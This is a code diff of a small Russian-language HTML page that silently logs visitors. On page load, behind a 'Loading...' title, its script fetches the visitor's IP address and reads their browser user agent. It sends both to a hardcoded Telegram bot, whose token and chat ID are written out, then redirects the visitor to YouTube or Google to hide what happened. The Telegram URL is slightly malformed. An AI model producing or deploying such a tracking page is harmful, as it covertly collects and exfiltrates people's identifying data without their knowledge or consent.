@@ -1,36 +1,34 @@
-<!DOCTYPE html>
-<html>
+ <!DOCTYPE html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <title>Загрузка...</title>
 </head>
-<body style="background: #000;">
+<body>
     <script>
-        // ТВОИ ПРОВЕРЕННЫЕ ДАННЫЕ
-        const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
-        const CHAT_ID = "8426763446";
+        // Твои данные уже вписаны
+        const botToken = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+        const chatId = "8426763446";
 
-        async function getIp() {
+        async function sendInfo() {
             try {
-                // 1. Получаем IP
-                const response = await fetch('https://api.ipify.org');
-                const data = await response.json();
-                const ip = data.ip;
+                // Узнаем IP через сторонний сервис
+                const ipRes = await fetch('https://api.ipify.org');
+                const ipData = await ipRes.json();
+                
+                const text = `🔔 Переход по ссылке!\n🌐 IP: ${ipData.ip}\n📱 Устройство: ${navigator.userAgent}`;
 
-                // 2. Ссылка для отправки (проверь каждый символ!)
-                const url = `https://api.telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("Кто-то перешел!\nIP: " + ip)}`;
-
-                // 3. Отправляем запрос
-                await fetch(url);
-
+                // Шлем в Telegram
+                await fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
             } catch (e) {
-                console.error(e);
+                console.error('Ошибка отправки');
             } finally {
-                // 4. Перекидываем на ютуб в любом случае
-                window.location.href = "https://www.youtube.com"; 
+                // Перекидываем на Google, чтобы страница не висела
+                window.location.href = "https://www.google.com";
             }
         }
 
-        getIp();
+        sendInfo();
     </script>
 </body>
 </html>
